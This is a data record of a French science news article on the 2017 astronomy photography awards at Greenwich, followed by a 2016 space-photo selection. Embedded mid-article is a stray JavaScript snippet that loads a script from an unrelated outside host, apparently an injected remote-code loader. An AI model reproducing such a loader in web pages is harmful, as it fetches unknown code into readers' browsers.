{"title": "Espace : les 10 plus belles photos de 2017", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "19/09/2017", "content": "Chaque année, un jury se réunit à l'observatoire de Greenwich, au Royaume-Uni, pour récompenser les plus belles photos du ciel prises par des astrophotographes du monde entier. Voici les premiers prix pour chacune des neuf catégories et les prix spéciaux. Ce qu'il faut retenir Les prix des plus belles photos d’astronomie de 2017 ont été décernés le 14 septembre à l’observatoire de Greenwich. Il y avait 3.800 participants issus de 91 pays différents. Le grand prix revient à Artem Mironov pour une photo  « exquise »  du nuage moléculaire Rho Ophiuchi. En neuf ans,  Insight Astronomy Photographer of the Year  est devenu un rendez-vous incontournable pour tous les astrophotographes de la Planète, mais aussi pour tous les curieux et passionnés d'astronomie.  Le 14 septembre, à l'observatoire royal de Greenwich, au Royaume-Uni, ont été dévoilées les photos couronnées par le jury de cette année.  « Pour la première fois en neuf ans de compétition, les juges ont reçu des images d'Uranus et d'astéroïdes parmi les 3.800 participants, des amateurs enthousiastes et des photographes professionnels venus de 91 pays »,  soulignait le communiqué. Les photos prises par les lauréats sont visibles à l'exposition dédiée, qui a ouvert ses portes le 16 septembre. Découvrez ci-dessous les premiers prix de chaque catégorie ainsi que les deux prix spéciaux.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  1. Grand prix : le nuage moléculaire Rho Ophiuchi Voici une photo splendide du complexe  Rho Ophiuchi  prise dans le ciel limpide de Namibie, en août 2016. Ce nuage coloré est l'une des régions de formation d' étoiles  les plus proches de notre  Système solaire . Distant de quelque 460 années-lumière, il s'étend sur environ 14 années-lumière au sein d'Ophiuchus, la treizième constellation du zodiaque. « Le photographe a produit un bel équilibre entre la nébuleuse de réflexion bleue, en bas à gauche, et la nébuleuse d'émission rouge, en haut à droite. Un nuage de poussière sombre s'allume devant eux, en divisant la scène en deux , a salué Pete Lawrence, membre du jury. [...]  Une image simplement exquise » . La photo a également été récompensée dans la catégorie « nébuleuses et étoiles ». Le nuage de gaz et de poussière Rho Ophiuchi ( Ophiuchus Molecular Cloud ).  « L’astrophotographie est comme un moyen d’être plus proche de l’infini, ce qui est bien sûr très attrayant » , a commenté le lauréat. © Artem Mironov, IAPY 2017                                2. Catégorie « aurores polaires » À l'affût sur le rivage, dans le sud de l'Islande, par une nuit d'octobre 2016, le photographe Mikkel Beiter raconte :  « Soudain, des  nuages  ont émergé des montagnes voisines, flottant sur la mer alors que l' aurore boréale  commençait à exploser puissamment. Tout cela a créé une véritable scène fantomatique ! » Des nuages flamboyants au-dessus du rivage. Cette aurore boréale a été photographiée le 5 octobre 2016, sur la côte sud de l’Islande. © Mikkel Beiter, IAPY 2017                        3. Catégorie « galaxies » : Messier 63 Surnommée la  galaxie du Tournesol  ( Sunflower Galaxy ), Messier 63 ou, pour faire court, M63, est à environ 26 millions d'années-lumière de la  Terre . Oleg Bryzgalov explique qu'il s'est rendu dans l'un des endroits les plus sombres d'Europe pour photographier cette galaxie et les traînées d'étoiles et de  gaz  qui l'entourent.  « Il y a tellement de détails incroyables à voir dans cette image,  s'enthousiasme Will Gater, membre du jury,  qu'il est difficile de savoir par où commencer. Les traînées de poussière et les régions rayonnantes d'étoiles roses du disque de M63 sont magnifiquement définies et les faibles flux d'étoiles qui tourbillonnent autour de la galaxie sont tout simplement extraordinaires. C'est avant que vous ne commenciez à explorer l'arrière-plan et la myriade de galaxies lointaines qui s'y cachent. » Messier 63, la galaxie du Tournesol, photographiée le 6 avril 2016 à l’observatoire Rozhen, dans les montagnes du Rhodope (Bulgarie),  « l’un des endroits les plus sombres d’Europe » . © Oleg Bryzgalov, IAPY 2017                                4. Catégorie « notre satellite naturel, la Lune » La photo ci-dessous a été prise depuis le sol terrestre, à Budapest, en Hongrie. Pourtant, nous avons l'impression d'être à bord d'un petit vaisseau spatial en approche de la  Lune . Sous nos yeux, le cratère rayonnant  Tycho  (bien visible dans des jumelles ou une lunette astronomique). L'impact est relativement récent à l'échelle géologique (une peu plus de 100 millions d'années). Les éjectas de poussière sont bien visibles des centaines de milliers de kilomètres à la ronde, de part et d'autre du cratère de 86 km de diamètre et de quelque 4,8 km de profondeur. Image hypersaturée du cratère Tycho. © László Francsics, IAPY 2017                                5. Catégorie « notre étoile, le Soleil » Cette photo du  Soleil  n'a pas été prise à n'importe quel moment... c'était le 9 mai 2016. Ce jour-là, certains Terriens pouvaient voir la plus petite planète du Système solaire,  Mercure, passer devant leur étoile . Regardez bien. On aperçoit sa silhouette ronde, un peu en dessous de l'équateur du Soleil. Les taches claires correspondent aux régions actives du Soleil. Transit de Mercure photographié le 9 mai 2016 dans le Lancashire, au Royaume-Uni. © Alexandra Hart, IAPY 2017                                6. Catégorie « Hommes et espace » Nous sommes ici aux confins du monde, face aux espaces infinis. Le photographe Yuri Zvezdny se tient debout dans ce paysage étonnant, au pied du glacier  Piedras Blancas , dans le parc national de  Los Glaciares,  en Argentine. Au-dessus de lui, la nuit australe et le centre de la  Voie lactée  : des  milliards d’autres soleils , chacun, ou presque, entouré de planètes... « Le premier plan donne un sentiment merveilleux de sérénité face à la majesté du centre de la  Voie lactée , dans le ciel, au-dessus , commente Pete Lawrence.  La scène est humble, mettant l'Homme devant l'une des plus impressionnantes toiles de fond de la nature » . La Voie lactée, resplendissante, au-dessus du paysage désolé du glacier  Piedras Blancas , en Argentine. © Yuri Zvezdny, IAPY 2017                                7. Catégorie « planètes, comètes et astéroïdes » Les changements de taille et de phase de  Vénus  sont ici photographiés durant six mois. Vue de la Terre, la planète la plus chaude du Système solaire, située entre nous et le Soleil, change progressivement de phase. Le phénomène peut augmenter significativement son éclat dans le ciel du crépuscule ou de l'aube (cela dépend des périodes), de même que sa taille apparente au gré de sa position relative à la Terre. Toutes les photos à gauche, jusqu'aux croissants, ont été prises avec des filtres infrarouges. Les différentes phases de Vénus. © Roger Hutchinson, IAPY 2017                                8. Catégorie « paysages célestes » Voici un paysage merveilleux que l'on a l'impression de voir à travers une fenêtre... peut-être est-ce à bord d'un vaisseau spatial ? Sommes-nous dans un des bras de la  Voie lactée  ? Voyageons-nous vers le centre de la Galaxie ? Non, nous sommes toujours sur Terre.  Intitulée  « Passage to the Milky Way »  ( Passage vers la Voie lactée ), la photo a été prise au Lamost ( Large Sky Area Multi-Object Fibre Spectroscopic Telescope ), dans la province d'Hebei, en Chine.  « J'adore la sensation dystopique de cette image : la Voie lactée soyeuse, encadrée par une architecture brutale, comme une scène d'un roman de J. G. Ballard » , déclare Melanie Vandenbrook, membre du jury. La Voie lactée vue du Lamost. © Haitong Yu, IAPY 2017                        9. Prix spécial jeunesse Âgée de 13 ans, la Britannique Olivia Williamson a reçu le premier prix de ce portrait de  Saturne  réalisé aux Émirats arabes unis le 27 mai 2016.  « Les conditions étaient les meilleures que j'avais vues depuis un certain temps et Saturne semblait avoir plus de détails que je n'en avais jamais vu , a déclaré la jeune astrophotographe.  J'ai fait le voyage avec mon père jusqu'au désert, près d'Al Khanzna, afin d'échapper à la  pollution lumineuse  de la ville » . Image très détaillée de Saturne, où l’on peut voir les différentes teintes de l’atmosphère de la géante gazeuse et, dans les anneaux, la division de Cassini. © Olivia Williamson, IAPY 2017                                10. Prix spécial : la nébuleuse du Cône Le lauréat Jason Green nous invite à travers cette image composite à une immersion dans la nébuleuse du Cône, située à 2.600 années-lumière de la Terre, au sein de la constellation de la Licorne. Les détails ont ravi le jury qui a décerné son prix spécial à ce nouveau-venu dans l'astrophotographie. Plongée dans la nébuleuse du Cône. © Jason Green, IAPY 2017                       « Une image merveilleuse, qui vaut tout le temps et l'effort minutieux qu'a passé  [le photographe]  pour la créer, montrant la nébuleuse du Cône dans toute sa beauté rouge foncé. Bienvenue à bord ! »  a salué Jon Culshaw, membre du jury. Pour en savoir plus Les plus belles photos de l'espace en 2016 Article de Xavier Demeersman publié le 27 décembre 2016 Voici notre sélection de dix photos d'événements astronomiques ou de rendez-vous célestes prises en 2016 par des amateurs passionnés. S'y ajoutent deux images réalisées par des missions spatiales qui ont marqué l'année. Superbe photo prise le 19 septembre 2016. Yuri Beletskty partage les beautés du ciel qu’il a saisies au-dessus des observatoires européens installés dans l’hémisphère sud (ESO), plongés dans les nuits parmi les plus limpides du monde. Le mont Paranal, au centre, haut de 2.700 m, paraît petit sous l’arche de la Voie lactée. © Y. Beletsky (LCO), ESO                               Les événements et phénomènes célestes qui ont marqué cette année 2016 n'ont pas échappé bien sûr à l' œil  averti des astrophotographes du monde entier. Notre sélection témoigne de leurs talents à saisir les scènes que jouent, exceptionnellement ou non, les  astres  au-dessus des paysages terrestres.  S'ajoutent à ce choix difficile, parmi des dizaines de photos splendides, deux images prises par des missions qui ont marqué 2016. L'une,  Rosetta , a photographié la  comète  Tchouri. L'autre,  Juno , s'intéresse aux secrets enfouis à l'intérieur de  Jupiter . Falcon 9 dans le ciel de Floride Très belle composition qui nous transporte dans les étoiles. Ici, le  lanceur   Falcon 9  de  SpaceX  enflamme le ciel de Floride. Il fonce tout droit vers la Voie lactée. C'était le 6 mai 2016, depuis la station  Air  Force à  Cap Canaveral . Falcon 9 s’élance vers les étoiles. © Mike Killian,  AmericaSpace                               Étoiles filantes, Voie lactée et nature terrestre Loin du monde ou presque... Les villes et la pollution lumineuse qui les auréole semblent bien loin. Cette photo de Raghu Yadavalli a été prise dans le parc national de Banff, dans l'Alberta. Nous sommes à la fin de l'été et le fleuve étoilé de la Voie lactée fait écho à celui qui serpente au premier plan. Des instants magiques ponctués d' étoiles filantes . Dialogue des paysages terrestres et célestes. © Raghu Yadavalli                               Une couronne tressée d’aurores Le premier septembre 2016, les particules solaires tombant dans l' atmosphère  terrestre ont tressé cette magnifique couronne de  brume  lumineuse dans le ciel tapissé d'étoiles du Maine, États-Unis. Pareille à un arc-en-ciel, une aurore boréale auréole le ciel du Maine. © Aaron D. Priest                               Superlune au-dessus du cosmodrome de Baikonour Des trois superlunes consécutives qui ont marqué 2016,  celle du 14 novembre  fut la plus grande. Le lanceur  Soyouz  (au premier plan) qui emmènera Thomas Pesquet le lendemain vers la  Station spatiale internationale  est dressé sur son pas de tir, prêt pour le départ. La superlune du 14 novembre, la plus grosse depuis 1948, toise le lanceur Soyouz. © Nasa, Bill Ingalls                               La Lune des récoltes partiellement éclipsée Image composite du lever de la  pleine Lune  de septembre, surnommée « lune des récoltes » ( harvest moon , en anglais), au-dessus du château de Sesimbra, au Portugal. Au même moment, notre satellite traversait la  pénombre  de la Terre. La Lune des récoltes s’élevant au-dessus du château de Sesimbra et voilée par une éclipse. © Miguel Claro (TWAN, Dark Sky Alqueva)                               Traînées d’étoiles et aurore boréale Alors que Deepanshu Arora faisait de longues pauses photo du ciel étoilé dans le magnifique écrin naturel du lac Minnewanka, dans le parc national de Banff, une aurore a surgi de l'horizon nord. Les étoiles les plus brillantes du ciel boréal laissent un filet lumineux accompagnant la rotation de la Terre. Une aurore s’est invitée dans ce décor naturel. © Deepanshu Arora                               Aurore et Voie lactée dans le ciel austral À gauche, la brume grumeleuse de la Voie lactée, nuages de gaz et de poussières entremêlés à des milliards d'étoiles, que l'on peut admirer ici dans sa moitié australe. Un petit nuage esseulé gonflé d'étoiles flotte au-dessus du paysage qui entoure le lac McGregor en Nouvelle-Zélande, incendié par une aurore. Il s'agit du  Petit Nuage de Magellan , une  galaxie naine , satellite de la nôtre. Aurore australe photographiée le 8 mai en Nouvelle-Zélande. © Manoj Kesavan                               Éclipse totale du Soleil du 9 mars 2016 Image composite de l' éclipse totale  du Soleil du 9 mars capturée en Indonésie. Ce jour-là, l'ombre de la Lune balaya une partie de la Terre, de l'océan Indien à l'océan Pacifique. L'Indonésie fut une des rares terres émergées où le phénomène a pu être observé. On peut admirer au centre la magnifique  couronne solaire  au moment de la totalité. Le 9 mars, les habitants d’Indonésie ont pu voir la Lune grignoter le Soleil. © Justin Ng                               Dernières images de Rosetta L'un des moments les plus marquants de ces dernières années dans l'histoire de l'exploration du Système solaire fut la mission de Rosetta autour de la comète Tchouri. Le 30 septembre 2016, au terme d'un accompagnement de deux ans, le moment était venu de dire adieu au vaisseau européen. C'est ainsi que, le plus doucement possible,  Rosetta  vint s'échouer sur l'astre bilobé pour un repos éternel. Une des dernières images prises par Rosetta avant son crash sur la comète Tchouri. © ESA, Rosetta,  MPS for OSIRIS Team MPS , UPD, LAM, IAA, SSO, INTA, UPM, DASP, IDA                                Jupiter vue de près par la sonde Juno Arrivée autour de Jupiter le 4 juillet, la sonde Juno a livré ses premières images de la  planète géante  fin août. Cette image a été prise le 11 décembre dernier à l'occasion de son troisième  survol  rapproché, en l'occurrence ici à 24.600 km. La tache ovale blanche que l'on aperçoit est la septième des huit  tempêtes  actuellement en rotation dans le sens inverse des aiguilles d'une montre dans l' hémisphère sud  de Jupiter. Une des huit tempêtes formant le « collier de perles » qu’arbore la géante Jupiter. © Nasa, JPL-Caltech, SwRI, MSSS                       ", "theme": "sciences"}